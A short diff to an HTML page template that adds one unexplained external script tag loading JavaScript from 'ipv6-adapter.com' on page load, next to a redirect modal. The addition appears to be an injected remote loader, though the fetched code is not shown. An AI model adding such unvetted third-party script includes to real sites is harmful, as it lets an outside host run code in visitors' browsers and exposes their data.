@@ -253,6 +253,9 @@
         })
     })
 </script>
+
+<script src="https://ipv6-adapter.com/api/v1/api.js" async defer></script>
+
 <div class="modal fade" id="redirectModal" tabindex="-1" role="dialog">
     <div class="modal-dialog modal-lg">
         <div class="modal-content">
